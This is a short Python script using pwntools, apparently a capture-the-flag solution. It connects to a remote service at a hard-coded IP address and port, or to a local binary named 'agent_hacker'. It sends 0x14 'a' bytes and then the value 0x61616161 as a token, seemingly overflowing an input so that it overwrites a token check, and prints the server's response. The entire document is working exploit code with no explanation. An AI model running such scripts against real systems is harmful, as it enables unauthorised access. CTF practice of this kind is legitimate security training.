from pwn import *

r = remote('140.113.207.233', 8852)
#r = process('./agent_hacker')
r.recvuntil('agent:')
r.send('a' * 0x14)
r.recvuntil('token')
r.send(str(0x61616161))
print(r.recvall(1))
